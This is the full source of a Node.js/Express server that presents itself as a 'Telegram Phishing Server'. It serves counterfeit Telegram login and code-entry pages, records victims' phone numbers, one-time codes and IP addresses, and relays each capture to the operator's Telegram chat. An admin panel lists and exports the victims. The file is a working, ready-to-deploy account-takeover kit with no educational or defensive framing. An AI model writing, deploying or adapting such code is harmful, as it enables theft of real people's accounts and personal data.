// server.js - Vercel-Compatible Telegram Phishing Server
const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIGURATION ====================
const CONFIG = {
    BOT_TOKEN: process.env.BOT_TOKEN || '',
    CHAT_ID: process.env.CHAT_ID || '',
    ADMIN_PASS: process.env.ADMIN_PASS || 'admin123',
    DATA_FILE: '/tmp/telegram_victims.json'
};

// ==================== SIMPLE DATA STORE ====================
let victims = [];
let logs = [];

// Load data from file
async function loadData() {
    try {
        const data = await fs.readFile(CONFIG.DATA_FILE, 'utf8');
        victims = JSON.parse(data);
        console.log(`Loaded ${victims.length} victims`);
    } catch (err) {
        console.log('Starting with empty database');
        victims = [];
    }
}

// Save data to file
async function saveData() {
    try {
        await fs.writeFile(CONFIG.DATA_FILE, JSON.stringify(victims, null, 2));
    } catch (err) {
        console.error('Error saving data:', err);
    }
}

// Initialize data
loadData();

// ==================== SIMPLE TELEGRAM BOT ====================
async function sendTelegramAlert(message) {
    if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID) {
        console.log('Telegram bot not configured');
        return false;
    }

    try {
        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return response.ok;
    } catch (err) {
        console.error('Telegram error:', err);
        return false;
    }
}

// ==================== MIDDLEWARE ====================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Logging middleware
app.use((req, res, next) => {
    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    const log = {
        time: new Date().toISOString(),
        ip: ip,
        method: req.method,
        url: req.url,
        userAgent: req.headers['user-agent'] || ''
    };
    
    logs.unshift(log);
    if (logs.length > 1000) logs.pop();
    
    console.log(`${log.time} | ${ip} | ${req.method} ${req.url}`);
    next();
});

// ==================== STATIC HTML PAGES ====================

// Home page
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Telegram Web</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #40a4e0 0%, #2a92d2 100%);
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                background: white;
                border-radius: 20px;
                padding: 40px;
                max-width: 400px;
                width: 100%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            .logo {
                font-size: 64px;
                color: #40a4e0;
                margin-bottom: 20px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
            }
            p {
                color: #666;
                margin-bottom: 30px;
                line-height: 1.5;
            }
            .btn {
                display: inline-block;
                background: #40a4e0;
                color: white;
                padding: 15px 30px;
                border-radius: 10px;
                text-decoration: none;
                font-weight: bold;
                font-size: 16px;
                transition: all 0.3s;
                border: none;
                cursor: pointer;
                width: 100%;
            }
            .btn:hover {
                background: #2a92d2;
                transform: translateY(-2px);
            }
            .counter {
                background: #f0f8ff;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                font-family: monospace;
                font-size: 18px;
                color: #40a4e0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">✈️</div>
            <h1>Telegram Web</h1>
            <p>Fast and secure messaging from any device.</p>
            
            <div class="counter" id="counter">${victims.length + 1245} users online</div>
            
            <a href="/login" class="btn">Start Messaging →</a>
            
            <p style="margin-top: 30px; font-size: 12px; color: #999;">
                By continuing, you agree to Telegram's Terms of Service
            </p>
        </div>
        
        <script>
            // Update counter
            let count = ${victims.length + 1245};
            setInterval(() => {
                count += Math.floor(Math.random() * 3);
                document.getElementById('counter').textContent = count + ' users online';
            }, 3000);
        </script>
    </body>
    </html>
    `);
});

// Login page
app.get('/login', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login to Telegram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .login-box {
                background: white;
                border-radius: 15px;
                padding: 40px;
                max-width: 400px;
                width: 100%;
                box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            }
            .logo {
                text-align: center;
                font-size: 48px;
                color: #40a4e0;
                margin-bottom: 20px;
            }
            h1 {
                text-align: center;
                color: #333;
                margin-bottom: 30px;
            }
            .input-group {
                margin-bottom: 20px;
            }
            label {
                display: block;
                margin-bottom: 8px;
                color: #666;
                font-size: 14px;
                font-weight: 500;
            }
            select, input {
                width: 100%;
                padding: 15px;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                font-size: 16px;
                transition: all 0.3s;
            }
            select:focus, input:focus {
                outline: none;
                border-color: #40a4e0;
                box-shadow: 0 0 0 3px rgba(64, 164, 224, 0.1);
            }
            .phone-input {
                display: flex;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                overflow: hidden;
            }
            .country-code {
                padding: 15px;
                background: #f8f9fa;
                border-right: 2px solid #e0e0e0;
                color: #333;
                font-weight: 500;
                min-width: 80px;
            }
            .phone-input input {
                border: none;
                border-radius: 0;
            }
            .btn {
                width: 100%;
                padding: 15px;
                background: #40a4e0;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 10px;
            }
            .btn:hover {
                background: #2a92d2;
            }
            .btn:disabled {
                background: #b2dffc;
                cursor: not-allowed;
            }
            .error {
                color: #ff4444;
                font-size: 14px;
                margin-top: 10px;
                display: none;
            }
            .loader {
                display: none;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #40a4e0;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">✈️</div>
            <h1>Sign in to Telegram</h1>
            
            <form id="loginForm">
                <div class="input-group">
                    <label>Country</label>
                    <select id="country">
                        <option value="+62">Indonesia (+62)</option>
                        <option value="+1">USA (+1)</option>
                        <option value="+44">UK (+44)</option>
                        <option value="+91">India (+91)</option>
                    </select>
                </div>
                
                <div class="input-group">
                    <label>Phone Number</label>
                    <div class="phone-input">
                        <div class="country-code" id="code">+62</div>
                        <input type="tel" id="phone" placeholder="81234567890" required>
                    </div>
                </div>
                
                <div class="error" id="error"></div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText">Next</span>
                    <div class="loader" id="loader"></div>
                </button>
            </form>
            
            <p style="margin-top: 30px; text-align: center; font-size: 12px; color: #999;">
                You'll receive a confirmation code via Telegram
            </p>
        </div>
        
        <script>
            document.getElementById('country').addEventListener('change', function() {
                document.getElementById('code').textContent = this.value;
            });
            
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const country = document.getElementById('country').value;
                const phone = document.getElementById('phone').value;
                const fullPhone = country + phone;
                
                if (!phone || phone.length < 8) {
                    showError('Please enter valid phone number');
                    return;
                }
                
                // Show loading
                const btn = document.getElementById('submitBtn');
                const btnText = document.getElementById('btnText');
                const loader = document.getElementById('loader');
                
                btn.disabled = true;
                btnText.style.display = 'none';
                loader.style.display = 'block';
                
                try {
                    const response = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone: fullPhone })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        setTimeout(() => {
                            window.location.href = '/otp?phone=' + encodeURIComponent(fullPhone);
                        }, 1000);
                    } else {
                        showError('Failed to send code. Try again.');
                        btn.disabled = false;
                        btnText.style.display = 'block';
                        loader.style.display = 'none';
                    }
                } catch (err) {
                    showError('Network error');
                    btn.disabled = false;
                    btnText.style.display = 'block';
                    loader.style.display = 'none';
                }
            });
            
            function showError(msg) {
                const errorDiv = document.getElementById('error');
                errorDiv.textContent = msg;
                errorDiv.style.display = 'block';
                setTimeout(() => errorDiv.style.display = 'none', 3000);
            }
        </script>
    </body>
    </html>
    `);
});

// OTP page
app.get('/otp', (req, res) => {
    const phone = req.query.phone || '+628123456789';
    const maskedPhone = phone.replace(/(\+\d{2})(\d{3})(\d{3})(\d+)/, '$1 $2 *** $4');
    const fakeCode = Math.floor(10000 + Math.random() * 90000);
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Enter Code • Telegram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f5f5;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .otp-box {
                background: white;
                border-radius: 15px;
                padding: 40px;
                max-width: 400px;
                width: 100%;
                box-shadow: 0 10px 40px rgba(0,0,0,0.1);
                text-align: center;
            }
            .logo {
                font-size: 48px;
                color: #40a4e0;
                margin-bottom: 20px;
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
            }
            .subtitle {
                color: #666;
                margin-bottom: 20px;
            }
            .phone-display {
                background: #f8f9fa;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                color: #333;
                font-weight: 500;
            }
            .code-inputs {
                display: flex;
                justify-content: center;
                gap: 10px;
                margin: 30px 0;
            }
            .code-input {
                width: 50px;
                height: 60px;
                text-align: center;
                font-size: 24px;
                font-weight: bold;
                border: 2px solid #e0e0e0;
                border-radius: 8px;
                background: white;
            }
            .code-input:focus {
                outline: none;
                border-color: #40a4e0;
                box-shadow: 0 0 0 3px rgba(64, 164, 224, 0.1);
            }
            .btn {
                width: 100%;
                padding: 15px;
                background: #40a4e0;
                color: white;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                font-size: 16px;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 20px;
            }
            .btn:hover {
                background: #2a92d2;
            }
            .btn:disabled {
                background: #b2dffc;
                cursor: not-allowed;
            }
            .loader {
                display: none;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #40a4e0;
                border-radius: 50%;
                width: 20px;
                height: 20px;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            .error {
                color: #ff4444;
                font-size: 14px;
                margin: 10px 0;
                display: none;
            }
            .sms-box {
                background: #e8f5e9;
                border: 1px solid #c8e6c9;
                border-radius: 10px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            .sms-code {
                display: inline-block;
                background: white;
                padding: 10px 20px;
                border-radius: 6px;
                font-family: monospace;
                font-size: 20px;
                font-weight: bold;
                letter-spacing: 5px;
                margin: 10px 0;
                cursor: pointer;
                border: 2px dashed #4CAF50;
            }
        </style>
    </head>
    <body>
        <div class="otp-box">
            <div class="logo">✈️</div>
            <h1>Enter Code</h1>
            <div class="subtitle">We sent a code to your Telegram app</div>
            
            <div class="phone-display">📱 ${maskedPhone}</div>
            
            <div class="sms-box">
                <strong>Telegram</strong> (just now)<br>
                Your code: <span class="sms-code" id="fakeCode">${fakeCode}</span><br>
                <small>Enter this 5-digit code</small>
            </div>
            
            <form id="otpForm">
                <div class="code-inputs">
                    <input type="text" class="code-input" maxlength="1" pattern="\\d" required>
                    <input type="text" class="code-input" maxlength="1" pattern="\\d" required>
                    <input type="text" class="code-input" maxlength="1" pattern="\\d" required>
                    <input type="text" class="code-input" maxlength="1" pattern="\\d" required>
                    <input type="text" class="code-input" maxlength="1" pattern="\\d" required>
                    <input type="hidden" id="fullCode">
                </div>
                
                <div class="error" id="error"></div>
                
                <button type="submit" class="btn" id="submitBtn">
                    <span id="btnText">Verify</span>
                    <div class="loader" id="loader"></div>
                </button>
            </form>
        </div>
        
        <script>
            const phone = '${phone}';
            const inputs = document.querySelectorAll('.code-input');
            const fakeCode = document.getElementById('fakeCode');
            
            // Auto-tab
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length === 1 && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                    updateCode();
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
            
            function updateCode() {
                const code = Array.from(inputs).map(i => i.value).join('');
                document.getElementById('fullCode').value = code;
            }
            
            // Auto-fill from fake code
            fakeCode.addEventListener('click', function() {
                const code = this.textContent;
                for (let i = 0; i < 5; i++) {
                    if (inputs[i]) {
                        inputs[i].value = code[i];
                    }
                }
                updateCode();
            });
            
            document.getElementById('otpForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const code = document.getElementById('fullCode').value;
                if (code.length !== 5) {
                    showError('Enter 5-digit code');
                    return;
                }
                
                // Show loading
                const btn = document.getElementById('submitBtn');
                const btnText = document.getElementById('btnText');
                const loader = document.getElementById('loader');
                
                btn.disabled = true;
                btnText.style.display = 'none';
                loader.style.display = 'block';
                
                try {
                    const response = await fetch('/api/verify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone: phone, code: code })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        setTimeout(() => {
                            window.location.href = '/success';
                        }, 1000);
                    } else {
                        showError('Invalid code');
                        btn.disabled = false;
                        btnText.style.display = 'block';
                        loader.style.display = 'none';
                    }
                } catch (err) {
                    showError('Network error');
                    btn.disabled = false;
                    btnText.style.display = 'block';
                    loader.style.display = 'none';
                }
            });
            
            function showError(msg) {
                const errorDiv = document.getElementById('error');
                errorDiv.textContent = msg;
                errorDiv.style.display = 'block';
                setTimeout(() => errorDiv.style.display = 'none', 3000);
            }
            
            // Auto-focus first input
            inputs[0].focus();
        </script>
    </body>
    </html>
    `);
});

// Success page
app.get('/success', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Welcome to Telegram</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #40a4e0 0%, #2a92d2 100%);
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .success-box {
                background: white;
                border-radius: 20px;
                padding: 50px 40px;
                max-width: 500px;
                width: 100%;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            }
            .success-icon {
                font-size: 80px;
                color: #4CAF50;
                margin-bottom: 20px;
                animation: bounce 1s;
            }
            @keyframes bounce {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-20px); }
            }
            h1 {
                color: #333;
                margin-bottom: 10px;
            }
            p {
                color: #666;
                margin-bottom: 30px;
                line-height: 1.5;
            }
            .btn {
                display: inline-block;
                background: #40a4e0;
                color: white;
                padding: 15px 30px;
                border-radius: 10px;
                text-decoration: none;
                font-weight: bold;
                font-size: 16px;
                margin: 10px;
                transition: all 0.3s;
            }
            .btn:hover {
                background: #2a92d2;
                transform: translateY(-2px);
            }
            .countdown {
                font-family: monospace;
                font-size: 18px;
                color: #40a4e0;
                margin: 20px 0;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="success-box">
            <div class="success-icon">✓</div>
            <h1>Welcome to Telegram!</h1>
            <p>Your account has been verified successfully. Start messaging now!</p>
            
            <div class="countdown" id="countdown">Redirecting in 5 seconds...</div>
            
            <div>
                <a href="https://web.telegram.org" class="btn" target="_blank">Open Telegram</a>
                <a href="/" class="btn" style="background: #f8f9fa; color: #333;">Back to Home</a>
            </div>
        </div>
        
        <script>
            let count = 5;
            const countdown = document.getElementById('countdown');
            
            function updateCountdown() {
                countdown.textContent = 'Redirecting in ' + count + ' seconds...';
                
                if (count <= 0) {
                    window.location.href = 'https://web.telegram.org';
                } else {
                    count--;
                    setTimeout(updateCountdown, 1000);
                }
            }
            
            updateCountdown();
            
            // Send completion data
            fetch('/api/complete', { method: 'POST' });
        </script>
    </body>
    </html>
    `);
});

// ==================== API ROUTES ====================

// Login API
app.post('/api/login', async (req, res) => {
    try {
        const { phone } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
        
        if (!phone || phone.length < 10) {
            return res.status(400).json({ success: false, error: 'Invalid phone number' });
        }
        
        // Create victim record
        const victim = {
            id: 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
            phone: phone,
            ip: ip,
            userAgent: req.headers['user-agent'] || '',
            timestamp: new Date().toISOString(),
            step: 'login'
        };
        
        victims.unshift(victim);
        await saveData();
        
        // Send Telegram alert
        const message = `🔔 NEW LOGIN ATTEMPT 🔔\n\n📱 Phone: ${phone}\n🌐 IP: ${ip}\n🕐 Time: ${new Date().toLocaleTimeString()}\n📊 Total Victims: ${victims.length}`;
        await sendTelegramAlert(message);
        
        console.log(`📱 Login captured: ${phone}`);
        
        res.json({ success: true, message: 'Code sent' });
        
    } catch (err) {
        console.error('Login error:', err);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Verify OTP API
app.post('/api/verify', async (req, res) => {
    try {
        const { phone, code } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
        
        if (!phone || !code) {
            return res.status(400).json({ success: false, error: 'Missing data' });
        }
        
        // Find victim
        const victim = victims.find(v => v.phone === phone);
        if (!victim) {
            return res.status(404).json({ success: false, error: 'Session expired' });
        }
        
        // Update victim with OTP
        victim.otp = code;
        victim.otpTime = new Date().toISOString();
        victim.step = 'verified';
        
        await saveData();
        
        // Send Telegram alert
        const message = `✅ OTP CAPTURED ✅\n\n📱 Phone: ${phone}\n🔐 Code: ${code}\n🌐 IP: ${ip}\n🕐 Time: ${new Date().toLocaleTimeString()}\n📊 Total: ${victims.length}`;
        await sendTelegramAlert(message);
        
        console.log(`🔐 OTP captured: ${code} for ${phone}`);
        
        res.json({ success: true, message: 'Verified successfully' });
        
    } catch (err) {
        console.error('Verify error:', err);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Complete API
app.post('/api/complete', async (req, res) => {
    try {
        // Just log completion
        console.log('✅ Account fully compromised');
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

// Admin API - Get victims
app.get('/api/admin/victims', (req, res) => {
    const { password } = req.query;
    
    if (password !== CONFIG.ADMIN_PASS) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    res.json({
        success: true,
        count: victims.length,
        victims: victims,
        logs: logs.slice(0, 100)
    });
});

// Status API
app.get('/api/status', (req, res) => {
    res.json({
        status: 'online',
        server_time: new Date().toISOString(),
        victims: victims.length,
        uptime: process.uptime()
    });
});

// Admin page
app.get('/admin', (req, res) => {
    const { password } = req.query;
    
    if (password !== CONFIG.ADMIN_PASS) {
        return res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Login</title>
            <style>
                body { font-family: Arial; padding: 50px; text-align: center; }
                input { padding: 10px; margin: 10px; width: 200px; }
                button { padding: 10px 20px; background: #40a4e0; color: white; border: none; }
            </style>
        </head>
        <body>
            <h1>Admin Login Required</h1>
            <form>
                <input type="password" name="password" placeholder="Admin Password" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        `);
    }
    
    const recentVictims = victims.slice(0, 50);
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
            .header { background: #40a4e0; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }
            .stat { background: white; padding: 20px; border-radius: 10px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .stat-number { font-size: 32px; font-weight: bold; color: #40a4e0; }
            table { width: 100%; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
            th { background: #f8f9fa; }
            .badge { background: #4CAF50; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px; }
            button { padding: 10px 15px; background: #40a4e0; color: white; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>📊 Telegram Phishing Admin</h1>
            <p>Total Victims: ${victims.length} | Last Updated: ${new Date().toLocaleTimeString()}</p>
            <button onclick="location.reload()">🔄 Refresh</button>
            <button onclick="exportData()">📥 Export JSON</button>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">${victims.length}</div>
                <div>Total Victims</div>
            </div>
            <div class="stat">
                <div class="stat-number">${victims.filter(v => v.otp).length}</div>
                <div>OTP Captured</div>
            </div>
            <div class="stat">
                <div class="stat-number">${new Date().toLocaleDateString()}</div>
                <div>Today</div>
            </div>
        </div>
        
        <h2>Recent Victims</h2>
        <table>
            <thead>
                <tr>
                    <th>Phone</th>
                    <th>OTP Code</th>
                    <th>IP Address</th>
                    <th>Time</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                ${recentVictims.map(v => `
                <tr>
                    <td><strong>${v.phone}</strong></td>
                    <td><code style="color: #4CAF50; font-weight: bold;">${v.otp || 'Pending'}</code></td>
                    <td><small>${v.ip}</small></td>
                    <td><small>${new Date(v.timestamp).toLocaleTimeString()}</small></td>
                    <td><span class="badge">${v.step}</span></td>
                </tr>
                `).join('')}
            </tbody>
        </table>
        
        <script>
            function exportData() {
                fetch('/api/admin/victims?password=${CONFIG.ADMIN_PASS}')
                    .then(res => res.json())
                    .then(data => {
                        const blob = new Blob([JSON.stringify(data.victims, null, 2)], { type: 'application/json' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'victims_' + Date.now() + '.json';
                        a.click();
                    });
            }
            
            // Auto-refresh every 30 seconds
            setInterval(() => {
                location.reload();
            }, 30000);
        </script>
    </body>
    </html>
    `);
});

// ==================== 404 HANDLER ====================
app.use((req, res) => {
    res.status(404).send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 - Telegram</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; }
            h1 { color: #40a4e0; }
        </style>
    </head>
    <body>
        <h1>404 - Page Not Found</h1>
        <p>The page you're looking for doesn't exist.</p>
        <a href="/">Go to Telegram</a>
    </body>
    </html>
    `);
});

// ==================== ERROR HANDLER ====================
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Error - Telegram</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; }
            h1 { color: #ff4444; }
        </style>
    </head>
    <body>
        <h1>500 - Server Error</h1>
        <p>Something went wrong. Please try again later.</p>
        <a href="/">Go to Telegram</a>
    </body>
    </html>
    `);
});

// ==================== START SERVER ====================
if (process.env.VERCEL) {
    // Export for Vercel
    module.exports = app;
} else {
    // Start local server
    app.listen(PORT, () => {
        console.log(`
╔══════════════════════════════════════╗
║     TELEGRAM PHISHING SERVER         ║
║     Running on port ${PORT}             ║
║     Local: http://localhost:${PORT}        ║
║     Admin: http://localhost:${PORT}/admin   ║
║     Password: ${CONFIG.ADMIN_PASS}           ║
╚══════════════════════════════════════╝
        `);
    });
}
